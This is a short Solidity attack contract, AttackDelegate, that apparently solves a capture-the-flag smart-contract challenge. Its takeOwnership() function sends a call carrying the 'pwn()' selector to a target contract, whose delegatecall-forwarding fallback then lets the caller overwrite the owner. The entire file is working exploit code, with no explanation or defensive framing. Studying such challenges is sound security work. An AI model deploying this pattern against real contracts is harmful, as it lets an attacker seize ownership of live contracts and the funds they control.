pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract AttackDelegate {

  address public delegateContract;
  bytes public callData = abi.encodeWithSignature("pwn()",0);

  constructor(address _delegateContract) public {
    delegateContract = _delegateContract;
  }

  function takeOwnership() public {
    
    (bool result,) = address(delegateContract)
      .call(callData);

  }
}